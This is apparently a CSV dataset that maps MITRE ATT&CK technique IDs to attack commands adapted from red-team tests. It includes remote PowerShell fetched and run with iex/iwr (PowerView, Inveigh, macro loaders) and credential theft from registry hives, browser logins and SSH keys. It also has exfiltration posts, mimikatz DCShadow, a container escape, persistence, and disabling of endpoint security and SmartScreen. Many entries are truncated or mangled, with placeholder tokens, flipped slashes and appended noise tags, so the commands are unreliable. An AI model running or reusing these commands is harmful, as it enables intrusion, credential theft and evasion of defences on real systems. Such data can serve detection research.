mitre_id,command
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)# run_5512
T1033,set file=var_976\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1611,"echo ""current user: var_944"" sudo -u docker_user sh -c ""sudo docker run -v \:\mnt --rm --name t1611_privesc -it alpine chroot \mnt id"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""> /dev/null 2>&1 # id_72"
T1222,new-itemproperty -path hklm:\software\policies\microsoft\windows\filesystems\ntfs -name symlinkremotetolocalevaluation -propertytype dword -value 1 -force -erroraction ignore new-itemproperty -path hklm:\software\policies\microsoft\windows\filesystems\ntfs -name symlinkremotetoremoteevaluation -propertytype dword -value 1 -force -erroraction ignore
T1014,sudo modprobe var_761
T1072,"""%programfiles(x86)%\var_95080"""
T1014,sudo modprobe var_28520
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_402"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1218,"rundll32.exe zipfldr.dll,routethecall ""#{exe_to_launch}"""
T1648,"import-module  ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1""  -force  $access_key  =  ""var_99348""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  -terraformvariables  @(""profile=t1648-1"",  ""region=$region"")  invoke-lambdaattack  -awsprofile  ""t1648-1""  -awsregion  $region"
T1041,if(-not (test-path var_913 -method post -body $filecontent -disablekeepalive
T1555,"copy-item ""$env:appdata\opera software\opera stable\login data"" -destination ""pathtoatomicsfolder\..\externalpayloads""> /dev/null 2>&1 # id_63"
T1187,rpcping  -s  var_45264  \a  connect  \u  ntlm  1>$null
T1053,"schtasks /create /tn ""t1053_005_onlogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" schtasks /create /tn ""t1053_005_onstartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe"""
T1056,"auditctl -a always,exit -f arch=b64 -s execve -k cmds auditctl -a always,exit -f arch=b32 -s execve -k cmds whoami; ausearch -i --start now> /dev/null 2>&1 # id_69"
T1090,export var_72926
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_70087 write-host ""end of federation configuration."""
T1613,podman  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  podman  run  --name  t1613_container  --rm  -d  -t  t1613  podman  ps  podman  stats  --no-stream  podman  inspect  $(podman  ps  -l  -q  --filter  ancestor=t1613)# run_1484
T1021,"reg add ""hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" \v userauthentication \d 0 \t reg_dword \f"
T1564,"sc.exe create #{service_name} binpath= ""#{executable_command}"" sc sdset #{service_name} ""d:(d;;dclcwpdtsd;;;iu)(d;;dclcwpdtsd;;;su)(d;;dclcwpdtsd;;;ba)(a;;cclcswlocrrc;;;iu)(a;;cclcswlocrrc;;;su)(a;;cclcswrpwpdtlocrrc;;;sy)(a;;ccdclcswrpwpdtlocrsdrcwdwo;;;ba)s:(au;fa;ccdclcswrpwpdtlocrsdrcwdwo;;;wd)"""
T1482,"""var_18428"
T1654,wevtutil  enum-logs# run_4742
T1059,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1""  -usebasicparsing)  invoke-maldoc  -macrofile  ""pathtoatomicsfolder\t1059.005\src\t1059_005-macrocode.txt""  -officeproduct  ""word""  -sub  ""extract"""
T1049,$syntaxlist = var_59971
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_696\extension\"" -passthru"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_877"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1654,wevtutil enum-logs> /dev/null 2>&1 # id_34
T1020,"$filename = ""var_86020"
T1072,"""%programfiles(x86)%\var_172"""
T1553,"$cert = import-certificate -filepath #{pfx_path} -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root""# run_1046"
T1497,ping -c #{ping_count} 44.77.4.216 > /dev/null #{evil_command}
T1114,"powershell -executionpolicy bypass -command ""var_65062"
T1039,"copy-item -path ""\\var_702"""
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y> /dev/null 2>&1 # id_51"
T1132,echo -n 111-11-1111 | base64 curl -xpost var_221
T1003,reg save hklm\sam %temp%\sam reg save hklm\system %temp%\system reg save hklm\security %temp%\security
T1134,"start-process  ""var_45341""  -argument  ""-u:t  -p:e  cmd""  start-sleep  -second  5  stop-process  -name  ""cmd""  -force  -erroraction  silentlycontinue"
T1135,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1' -usebasicparsing); find-domainshare -checkshareaccess -verbose
T1221,"start  ""var_554"""
T1057,tasklist  |  findstr  var_974
T1485,dd of=var_73604') iflag=count_bytes
T1014,"sudo modprobe var_225 hidden"""
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""# run_9029"
T1119,mkdir %temp%\t1119_command_prompt_collection >nul 2>&1 dir c: \b \s .docx | findstr \e .docx for \r c:\ %f in (*.docx) do copy \y %f %temp%\t1119_command_prompt_collection# run_3526
T1552,find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} exit 0# run_4277
T1546,"$filterargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=new-ciminstance -namespace root\subscription -classname __eventfilter -property $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; commandlinetemplate=""$($env:systemroot)\system32\notepad.exe"";} $consumer=new-ciminstance -namespace root\subscription -classname commandlineeventconsumer -property $consumerargs $filtertoconsumerargs = @{ filter = [ref] $filter; consumer = [ref] $consumer; } $filtertoconsumerbinding = new-ciminstance -namespace root\subscription -classname __filtertoconsumerbinding -property $filtertoconsumerargs# run_7938"
T1609,kubectl create -f var_635
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_9819 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1518,pgrep  -l  'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
T1056,"mavinject  $pid  \injectrunning  ""var_240  -usebasicparsing"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh# run_2101
T1135,dir \\#{computer_ip}\c$ dir \\#{computer_ip}\admin$ dir \\#{computer_ip}\ipc$# run_9019
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached# run_4825"
T1197,bitsadmin.exe \create var_42636
T1580,aws  ec2  describe-security-groups  --profile  var_204
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_329"""
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_896 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_859"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1567,"$apikey = ""var_757 $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1113,"cmd \c start \b psr.exe \start \output var_19648 > null && psr.exe \stop"""
T1129,"var_169"""
T1611,if [ ! -d var_574 2>&1
T1562,"if [ $(rpm -q --queryformat '%{version}' centos-release) -eq ""6"" ]; then service cbdaemon stop chkconfig off cbdaemon else if [ $(rpm -q --queryformat '%{version}' centos-release) -eq ""7"" ]; systemctl stop cbdaemon systemctl disable cbdaemon fi"
T1489,net.exe stop #{service_name}
T1572,nohup code tunnel --accept-server-license-terms var_46522 >\dev\null 2>&1 &
T1040,sudo var_70956 -4 -p 6 -t 3
T1137,"$excelapp = new-object -comobject ""excel.application"" if(-not $excelapp.path.contains(""program files (x86)"")){ write-host ""64-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"") } else{ write-host ""32-bit office"" $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"") }> /dev/null 2>&1 # id_62"
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)# run_8083
T1490,sudo tmutil disable
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard""> /dev/null 2>&1 # id_76"
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_362 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_184
T1216,set comspec=var_43084 cscript %windir%\system32\manage-bde.wsf
T1098,"$credfile = ""var_610"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_729"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""# run_2419"
T1546,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v debugger /d ""#{payload_binary}"""
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}> /dev/null 2>&1 # id_76
T1615,get-gpo -domain $env:userdnsdomain #{gpo_param} >> #{gpo_output}# run_4227
T1018,for \l %i in (var_38208.%i
T1090,export var_53873
T1057,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\#{pchunter64_exe}""# run_6953"
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimedc \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimeoffsetdc \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtime \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v grouppolicyrefreshtimeoffset \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v enablesmartscreen \t reg_dword \d 0 \f reg add ""hklm\software\policies\microsoft\windows\system"" \v shellsmartscreenlevel \t reg_sz \d block \f> /dev/null 2>&1 # id_26"
T1057,"start-process -filepath ""$env:programfiles\process hacker 2\var_953"""
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domainuser -preauthnotrequired -properties distinguishedname -verbose
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f# run_7002
T1053,kubectl  get  cronjobs  -n  var_552
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.21689\ubolite_2024.11.25.22482.chromium.mv3.zip"" set-location ""var_87965\extension\"" -passthru"
T1120,get-printer> /dev/null 2>&1 # id_16
T1578,az snapshot create --resource-group var_61998 --location eastus
T1490,vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%> /dev/null 2>&1 # id_44
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_24817""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1053,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{target} -accepteula -s ""cmd.exe"" ""pathtoatomicsfolder\..\externalpayloads\ghosttask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon"
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f> /dev/null 2>&1 # id_51"
